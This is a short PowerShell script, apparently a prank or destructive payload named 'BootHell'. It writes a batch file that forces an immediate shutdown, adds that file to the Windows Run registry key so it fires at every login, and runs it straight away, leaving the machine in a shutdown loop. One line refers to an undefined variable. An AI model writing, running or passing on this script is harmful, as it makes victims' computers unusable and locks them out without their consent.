$keyPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\"
$keyName = "Run"
$filePath = $env:TMP + "\boothell.cmd"


Set-Content -Path $filePath -Value "shutdown -s -f -t 0"

New-Item -Path $keyPath -Name $keyName
New-ItemProperty -Path $keyPath$keyName -Name "BootHell" -Value $filePath;

Remove-Item $fileToDelete

start $filePath